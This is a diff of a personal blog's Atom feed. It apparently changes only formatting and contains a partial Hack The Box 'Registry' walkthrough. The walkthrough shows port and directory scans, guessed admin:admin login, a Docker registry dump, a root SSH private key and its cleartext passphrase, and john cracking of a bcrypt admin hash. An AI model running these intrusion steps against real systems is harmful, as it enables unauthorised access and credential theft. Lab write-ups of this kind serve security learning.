@@ -1,34 +1,24 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="https://aidanstansfield.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://aidanstansfield.github.io/" rel="alternate" type="text/html" /><updated>2020-04-27T23:37:46+10:00</updated><id>https://aidanstansfield.github.io/feed.xml</id><title type="html">Aidan’s Blog</title><subtitle>G'day, I'm Aidan and I like to make things, almost as much as I like to break things. In this blog you can expect to find writeups of various home/personal projects, as well as hackthebox/ctf writeups. Hope you enjoy!</subtitle><entry><title type="html">Intro to Web Security</title><link href="https://aidanstansfield.github.io/2020/04/26/intro-to-websec.html" rel="alternate" type="text/html" title="Intro to Web Security" /><published>2020-04-26T11:30:00+10:00</published><updated>2020-04-26T11:30:00+10:00</updated><id>https://aidanstansfield.github.io/2020/04/26/intro-to-websec</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/04/26/intro-to-websec.html">&lt;p&gt;This isn’t so much a post, just a share of something I did. So last week I gave a talk to the &lt;a href=&quot;https://cybersquad.uqcloud.net/&quot;&gt;UQ Cyber Squad&lt;/a&gt; called &lt;strong&gt;“Introduction to Web Security”&lt;/strong&gt;. Since WebSec is massive and this was a talk for beginners, I decided to come at this from the angle of &lt;em&gt;WebSec for CTFs&lt;/em&gt;, since it serves as an easy entry point to those not familiar with the theory and tools, and it’s an area I have some decent experience in.&lt;/p&gt;
-
-&lt;p&gt;That being said, here’s the links:&lt;/p&gt;
-
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://aidanstansfield.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://aidanstansfield.github.io/" rel="alternate" type="text/html" /><updated>2020-05-15T11:31:44+10:00</updated><id>https://aidanstansfield.github.io/feed.xml</id><title type="html">Aidan’s Blog</title><subtitle>G'day, I'm Aidan and I like to make things, almost as much as I like to break things. In this blog you can expect to find writeups of various home/personal projects, as well as hackthebox/ctf writeups. Hope you enjoy!</subtitle><entry><title type="html">Intro to Web Security</title><link href="https://aidanstansfield.github.io/2020/04/26/intro-to-websec.html" rel="alternate" type="text/html" title="Intro to Web Security" /><published>2020-04-26T11:30:00+10:00</published><updated>2020-04-26T11:30:00+10:00</updated><id>https://aidanstansfield.github.io/2020/04/26/intro-to-websec</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/04/26/intro-to-websec.html">&lt;p&gt;This isn't so much a post, just a share of something I did. So last week I gave a talk to the &lt;a href=&quot;https://cybersquad.uqcloud.net/&quot;&gt;UQ Cyber Squad&lt;/a&gt; called &lt;strong&gt;&amp;quot;Introduction to Web Security&amp;quot;&lt;/strong&gt;. Since WebSec is massive and this was a talk for beginners, I decided to come at this from the angle of &lt;em&gt;WebSec for CTFs&lt;/em&gt;, since it serves as an easy entry point to those not familiar with the theory and tools, and it's an area I have some decent experience in.&lt;/p&gt;
+&lt;p&gt;That being said, here's the links:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&quot;https://drive.google.com/open?id=1c37tw3RH1CqAYF_pu6lKc3SFGYe8HSDm&quot;&gt;Video&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;&lt;a href=&quot;https://drive.google.com/open?id=1mTnQG0nP3FYmRiP8mfeoa7lDJzWTU9gs&quot;&gt;Slides&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;&lt;a href=&quot;https://ctf.uqcloud.net/&quot;&gt;Challenges&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Enjoy!&lt;/p&gt;</content><author><name></name></author><category term="web" /><category term="security" /><category term="lfi" /><category term="rfi" /><category term="injection" /><summary type="html">This isn’t so much a post, just a share of something I did. So last week I gave a talk to the UQ Cyber Squad called “Introduction to Web Security”. Since WebSec is massive and this was a talk for beginners, I decided to come at this from the angle of WebSec for CTFs, since it serves as an easy entry point to those not familiar with the theory and tools, and it’s an area I have some decent experience in.</summary></entry><entry><title type="html">Registry: Hack The Box Writeup</title><link href="https://aidanstansfield.github.io/2020/03/30/htb-registry-walkthrough.html" rel="alternate" type="text/html" title="Registry: Hack The Box Writeup" /><published>2020-03-30T11:30:00+10:00</published><updated>2020-03-30T11:30:00+10:00</updated><id>https://aidanstansfield.github.io/2020/03/30/htb-registry-walkthrough</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/03/30/htb-registry-walkthrough.html">&lt;p&gt;Welcome to my first Hack The Box walkthrough! In this writeup, we’re going to take a look at &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/213&quot;&gt;Registry&lt;/a&gt;. This is a “Hard” Linux machine as classified by the team at Hack The Box, and it took me a couple days to crack! Since finishing it, I received lots of requests for nudges/hints regarding the box, and so I figured making a walkthrough would be good for the community, and give me an excuse to do my first write-up. So let’s begin!&lt;/p&gt;
-
+&lt;p&gt;Enjoy!&lt;/p&gt;</content><author><name></name></author><category term="web" /><category term="security" /><category term="lfi" /><category term="rfi" /><category term="injection" /><summary type="html">This isn't so much a post, just a share of something I did. So last week I gave a talk to the UQ Cyber Squad called &amp;quot;Introduction to Web Security&amp;quot;. Since WebSec is massive and this was a talk for beginners, I decided to come at this from the angle of WebSec for CTFs, since it serves as an easy entry point to those not familiar with the theory and tools, and it's an area I have some decent experience in.</summary></entry><entry><title type="html">Registry: Hack The Box Writeup</title><link href="https://aidanstansfield.github.io/2020/03/30/htb-registry-walkthrough.html" rel="alternate" type="text/html" title="Registry: Hack The Box Writeup" /><published>2020-03-30T11:30:00+10:00</published><updated>2020-03-30T11:30:00+10:00</updated><id>https://aidanstansfield.github.io/2020/03/30/htb-registry-walkthrough</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/03/30/htb-registry-walkthrough.html">&lt;p&gt;Welcome to my first Hack The Box walkthrough! In this writeup, we're going to take a look at &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/213&quot;&gt;Registry&lt;/a&gt;. This is a &amp;quot;Hard&amp;quot; Linux machine as classified by the team at Hack The Box, and it took me a couple days to crack! Since finishing it, I received lots of requests for nudges/hints regarding the box, and so I figured making a walkthrough would be good for the community, and give me an excuse to do my first write-up. So let's begin!&lt;/p&gt;
 &lt;h1 id=&quot;foothold&quot;&gt;Foothold&lt;/h1&gt;
 &lt;p&gt;As with any box, we begin with scanning and enumeration. My first command on any new box is the following nmap scan:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -A -T4 -v -oN nmap -Pn -p- 10.10.10.159
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;pre&gt;&lt;code&gt;nmap -A -T4 -v -oN nmap -Pn -p- 10.10.10.159
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Breaking the options down, we have:&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;-A: Enable OS detection, version detection, script scanning, and traceroute&lt;/li&gt;
-  &lt;li&gt;-T4: Run at a higher speed template&lt;/li&gt;
-  &lt;li&gt;-v: Be verbose, tell us if you find something as you find it.&lt;/li&gt;
-  &lt;li&gt;-oN nmap: Output the results in normal format into a file called ‘nmap’&lt;/li&gt;
-  &lt;li&gt;-Pn: Treat the host as online even if it doesn’t respond to ping&lt;/li&gt;
-  &lt;li&gt;-p-: Enumerate all ports&lt;/li&gt;
+&lt;li&gt;-A: Enable OS detection, version detection, script scanning, and traceroute&lt;/li&gt;
+&lt;li&gt;-T4: Run at a higher speed template&lt;/li&gt;
+&lt;li&gt;-v: Be verbose, tell us if you find something as you find it.&lt;/li&gt;
+&lt;li&gt;-oN nmap: Output the results in normal format into a file called 'nmap'&lt;/li&gt;
+&lt;li&gt;-Pn: Treat the host as online even if it doesn't respond to ping&lt;/li&gt;
+&lt;li&gt;-p-: Enumerate all ports&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;p&gt;Looking at the results,&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; kali@kali:~/htb/registry$ cat nmap 
+&lt;pre&gt;&lt;code&gt;kali@kali:~/htb/registry$ cat nmap 
 # Nmap 7.80 scan initiated Sun Mar 29 22:19:54 2020 as: nmap -A -T4 -v -oN nmap -Pn -p- 10.10.10.159
 Warning: 10.10.10.159 giving up on port because retransmission cap hit (6).
 Nmap scan report for registry.htb (10.10.10.159)
@@ -81,31 +71,23 @@ PORT      STATE    SERVICE  VERSION
 62663/tcp filtered unknown
 65460/tcp filtered unknown
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We see port 22 (ssh), 80 &amp;amp; 443 (web) are open, as well as a bunch of other ‘filtered’ ports. We also see that there is an ssl certificate with the subject name &lt;code class=&quot;highlighter-rouge&quot;&gt;commonName=docker.registry.htb&lt;/code&gt;.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We see port 22 (ssh), 80 &amp;amp; 443 (web) are open, as well as a bunch of other 'filtered' ports. We also see that there is an ssl certificate with the subject name &lt;code&gt;commonName=docker.registry.htb&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Whenever I discover a box has a web port open, the first action is always to visit the website and see what it is!&lt;/p&gt;
-
 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/webpage.png&quot; alt=&quot;Web Page&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Lame, just a plain old default nginx installation. Maybe there’s other content on the server, you just have to know the URL? To do this, we begin directory busting. I personally prefer gobuster, and use it as follows:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster dir -w /usr/share/wordlists/dirb/common.txt -r -o gobuster -x php -u http://10.10.10.159
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;p&gt;Lame, just a plain old default nginx installation. Maybe there's other content on the server, you just have to know the URL? To do this, we begin directory busting. I personally prefer gobuster, and use it as follows:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -w /usr/share/wordlists/dirb/common.txt -r -o gobuster -x php -u http://10.10.10.159
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Breaking down the options, we see:&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;-w /usr/share/wordlists/dirb/common.txt: Use this wordlist. If this fails to find something, my next resort is /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt and then /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/li&gt;
-  &lt;li&gt;-r: Follow redirects&lt;/li&gt;
-  &lt;li&gt;-o gobuster: output the results into a file called ‘gobuster’&lt;/li&gt;
-  &lt;li&gt;-x php: Try adding the ‘.php’ extension onto every url&lt;/li&gt;
-  &lt;li&gt;-u: The base url to append to.&lt;/li&gt;
+&lt;li&gt;-w /usr/share/wordlists/dirb/common.txt: Use this wordlist. If this fails to find something, my next resort is /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt and then /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/li&gt;
+&lt;li&gt;-r: Follow redirects&lt;/li&gt;
+&lt;li&gt;-o gobuster: output the results into a file called 'gobuster'&lt;/li&gt;
+&lt;li&gt;-x php: Try adding the '.php' extension onto every url&lt;/li&gt;
+&lt;li&gt;-u: The base url to append to.&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;p&gt;Looking at the results,&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/htb/registry$ cat gobuster 
+&lt;pre&gt;&lt;code&gt;kali@kali:~/htb/registry$ cat gobuster 
 /.bash_history (Status: 403)
 /.hta (Status: 403)
 /.htaccess (Status: 403)
@@ -113,39 +95,26 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 /backup.php (Status: 200)
 /index.html (Status: 200)
 /install (Status: 200)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We find a &lt;code class=&quot;highlighter-rouge&quot;&gt;/backup.php&lt;/code&gt; which is blank&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We find a &lt;code&gt;/backup.php&lt;/code&gt; which is blank&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/blankbackupphp.png&quot; alt=&quot;backup.php&quot; /&gt;
-We also find &lt;code class=&quot;highlighter-rouge&quot;&gt;/install&lt;/code&gt; which seems to contain a bunch of random bytes.&lt;/p&gt;
-
+We also find &lt;code&gt;/install&lt;/code&gt; which seems to contain a bunch of random bytes.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/install.png&quot; alt=&quot;install&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Since we’ve more or less come to a dead end, lets backtrack a bit and checkout that &lt;code class=&quot;highlighter-rouge&quot;&gt;docker.registry.htb&lt;/code&gt; we saw in the nmap scan earlier.&lt;/p&gt;
-
-&lt;p&gt;Adding &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.159 docker.registry.htb&lt;/code&gt; to our &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file, we can navigate to the page and find the following.&lt;/p&gt;
-
+&lt;p&gt;Since we've more or less come to a dead end, lets backtrack a bit and checkout that &lt;code&gt;docker.registry.htb&lt;/code&gt; we saw in the nmap scan earlier.&lt;/p&gt;
+&lt;p&gt;Adding &lt;code&gt;10.10.10.159 docker.registry.htb&lt;/code&gt; to our &lt;code&gt;/etc/hosts&lt;/code&gt; file, we can navigate to the page and find the following.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/dockerblank.png&quot; alt=&quot;blankdocker&quot; /&gt;
-Great. Another blank page. Let’s see if there’s anything hidden with some more directory busting.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/htb/registry$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -r -o docker-gobuster -x php -q -u http://docker.registry.htb/
+Great. Another blank page. Let's see if there's anything hidden with some more directory busting.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/htb/registry$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -r -o docker-gobuster -x php -q -u http://docker.registry.htb/
 /v2 (Status: 401)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Well that looks interesting. Let’s take a look.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Well that looks interesting. Let's take a look.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/v2.png&quot; alt=&quot;v2&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;It’s asking for some basic authentication! Now, you could spin up Hydra to crack this, or you could be lucky like me and try admin:admin and get let in! Unfortunately, getting in reveals only a blank JSON viewer. After fumbling around for a while, I passed it to burp and saw an interesting response header to all of my requests.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker-distribution-api-version: registry/2.0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A bit of googling revealed that this implies the website is the running Docker Registry API service! After doing a bit of research, I stumbled upon &lt;a href=&quot;https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/&quot;&gt;this blog post&lt;/a&gt; which detailed how this API could be exploited, by downloading all files available in the registry. Using the script the author made available &lt;a href=&quot;https://github.com/NotSoSecure/docker_fetch/&quot;&gt;here&lt;/a&gt;, I was able to pull down the contents of the ‘bolt-image’ repo as shown below.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/htb/registry$ python docker_image_fetch.py -u http://docker.registry.htb:80
-{&quot;repositories&quot;:[&quot;bolt-image&quot;]}
+&lt;p&gt;It's asking for some basic authentication! Now, you could spin up Hydra to crack this, or you could be lucky like me and try admin:admin and get let in! Unfortunately, getting in reveals only a blank JSON viewer. After fumbling around for a while, I passed it to burp and saw an interesting response header to all of my requests.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;docker-distribution-api-version: registry/2.0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;A bit of googling revealed that this implies the website is the running Docker Registry API service! After doing a bit of research, I stumbled upon &lt;a href=&quot;https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/&quot;&gt;this blog post&lt;/a&gt; which detailed how this API could be exploited, by downloading all files available in the registry. Using the script the author made available &lt;a href=&quot;https://github.com/NotSoSecure/docker_fetch/&quot;&gt;here&lt;/a&gt;, I was able to pull down the contents of the 'bolt-image' repo as shown below.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/htb/registry$ python docker_image_fetch.py -u http://docker.registry.htb:80
+{&amp;quot;repositories&amp;quot;:[&amp;quot;bolt-image&amp;quot;]}
 
 http://docker.registry.htb:80/v2/_catalog
 
@@ -186,18 +155,14 @@ Open the directory, unzip all the files and explore like a Boss.
 [+] Downloading Blob: 8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797
 
 [+] Downloading Blob: f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;I then extracted all of the files to a tar folder with a bit of bash.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd docker
+&lt;pre&gt;&lt;code&gt;cd docker
 mkdir tar
 for filename in *.tar.gz; do tar -C tar -zxf $filename; done
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;The result of this is we get a (mostly) complete filesystem! After looking around, we find the following in the root directory.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/htb/registry/docker/tar$ cat root/.ssh/id_rsa
+&lt;pre&gt;&lt;code&gt;kali@kali:~/htb/registry/docker/tar$ cat root/.ssh/id_rsa
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9
@@ -257,31 +222,25 @@ Host registry
   User bolt
   Port 22
   Hostname registry.htb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Sweet! It looks like we have our way into the system!&lt;/p&gt;
 &lt;h1 id=&quot;user-1---bolt&quot;&gt;User 1 - Bolt&lt;/h1&gt;
-&lt;p&gt;In order to get the user, we need to ssh with the provided key. Unfortunately, this key is passphrase protected. Not to worry, as we can crack it using &lt;a href=&quot;https://github.com/magnumripper/JohnTheRipper&quot;&gt;JohnTheRipper&lt;/a&gt; and it’s many components. Simply convert the key into something john can crack, and then plug and play!&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/share/john/ssh2john.py bolt-ssh-key &amp;gt; uncracked
+&lt;p&gt;In order to get the user, we need to ssh with the provided key. Unfortunately, this key is passphrase protected. Not to worry, as we can crack it using &lt;a href=&quot;https://github.com/magnumripper/JohnTheRipper&quot;&gt;JohnTheRipper&lt;/a&gt; and it's many components. Simply convert the key into something john can crack, and then plug and play!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/usr/share/john/ssh2john.py bolt-ssh-key &amp;gt; uncracked
 sudo john --wordlist=/usr/share/wordlists/rockyou.txt uncracked
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;… but it didn’t find it. Maybe the password is hidden somewhere in all that stuff we pulled down! Having a look at root’s bash history, we see lots of mentions for &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/profile.d/01-ssh.sh&lt;/code&gt;. Investigating, we find&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/htb/registry/docker/tar$ cat etc/profile.d/01-ssh.sh 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;... but it didn't find it. Maybe the password is hidden somewhere in all that stuff we pulled down! Having a look at root's bash history, we see lots of mentions for &lt;code&gt;/etc/profile.d/01-ssh.sh&lt;/code&gt;. Investigating, we find&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/htb/registry/docker/tar$ cat etc/profile.d/01-ssh.sh 
 #!/usr/bin/expect -f
 #eval `ssh-agent -s`
 spawn ssh-add /root/.ssh/id_rsa
-expect &quot;Enter passphrase for /root/.ssh/id_rsa:&quot;
-send &quot;GkOcz221Ftb3ugog\n&quot;;
-expect &quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&quot;
+expect &amp;quot;Enter passphrase for /root/.ssh/id_rsa:&amp;quot;
+send &amp;quot;GkOcz221Ftb3ugog\n&amp;quot;;
+expect &amp;quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&amp;quot;
 interact
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Bingo! We’ve found the password for bolt’s ssh key. Plugging it in with ssh, we get into the system and hence get the user flag.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/htb/registry$ ssh -i bolt-ssh-key bolt@10.10.10.159
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Bingo! We've found the password for bolt's ssh key. Plugging it in with ssh, we get into the system and hence get the user flag.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/htb/registry$ ssh -i bolt-ssh-key bolt@10.10.10.159
 Enter passphrase for key 'bolt-ssh-key': 
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)
 
@@ -299,13 +258,11 @@ bolt@bolt:~$ ls
 user.txt
 bolt@bolt:~$ cat user.txt | wc -c
 33
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We can cat the user.txt, and it contains 32 characters (md5 hash) + a newline. I won’t be showing the flag itself, rather that I have the permissions to show the flag.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can cat the user.txt, and it contains 32 characters (md5 hash) + a newline. I won't be showing the flag itself, rather that I have the permissions to show the flag.&lt;/p&gt;
 &lt;h1 id=&quot;user-2---www-data&quot;&gt;User 2 - www-data&lt;/h1&gt;
-&lt;p&gt;After doing some enumeration and not finding much, I decided to look at what NGINX was serving in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:~$ ls -lA /var/www/html/
+&lt;p&gt;After doing some enumeration and not finding much, I decided to look at what NGINX was serving in &lt;code&gt;/var/www/html/&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bolt@bolt:~$ ls -lA /var/www/html/
 total 20
 -rw-r--r--  1 root     root       85 May 25  2019 backup.php
 -rw-------  1 git      www-data    0 Oct  8 21:54 .bash_history
@@ -313,47 +270,28 @@ drwxrwxr-x 11 www-data www-data 4096 Oct 21 08:27 bolt
 -rwxrwxr-x  1 www-data www-data  612 May  6  2019 index.html
 -rw-r--r--  1 root     root      612 Oct 21 08:41 index.nginx-debian.html
 drwxr-xr-x  2 root     root     4096 Sep 26  2019 install
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We can see what that &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.php&lt;/code&gt; file was doing.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;bolt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bolt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;backup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; 
-&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Looks dangerous. We’ll come back to this later. We also notice a &lt;code class=&quot;highlighter-rouge&quot;&gt;bolt&lt;/code&gt; directory which we didn’t discover before. Checking out the website and the source code, it appears to be a CMS (which Google verifies).&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can see what that &lt;code&gt;backup.php&lt;/code&gt; file was doing.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bolt@bolt:/var/www/html$ cat backup.php 
+&amp;lt;?php shell_exec(&amp;quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Looks dangerous. We'll come back to this later. We also notice a &lt;code&gt;bolt&lt;/code&gt; directory which we didn't discover before. Checking out the website and the source code, it appears to be a CMS (which Google verifies).&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/bolt.png&quot; alt=&quot;bolt&quot; /&gt;&lt;/p&gt;
-
 &lt;p&gt;When trying to access the admin panel, we are faced with a login.&lt;/p&gt;
-
 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/boltlogin.png&quot; alt=&quot;boltlogin&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;So we need to find some login credentials. Looking at the app’s config in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/bolt/app/config/config.yml&lt;/code&gt;, we see that it’s using a SQLITE database. Digging around, we found &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/bolt/app/database/bolt.db&lt;/code&gt;, and inside, we find &lt;code class=&quot;highlighter-rouge&quot;&gt;$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK&lt;/code&gt; as the hash for &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Passing these to JohnTheRipper, we quickly crack the password as ‘strawberry’. Sure enough, we can now login to the Bolt admin panel!&lt;/p&gt;
-
+&lt;p&gt;So we need to find some login credentials. Looking at the app's config in &lt;code&gt;/var/www/html/bolt/app/config/config.yml&lt;/code&gt;, we see that it's using a SQLITE database. Digging around, we found &lt;code&gt;/var/www/html/bolt/app/database/bolt.db&lt;/code&gt;, and inside, we find &lt;code&gt;$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK&lt;/code&gt; as the hash for &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Passing these to JohnTheRipper, we quickly crack the password as 'strawberry'. Sure enough, we can now login to the Bolt admin panel!&lt;/p&gt;
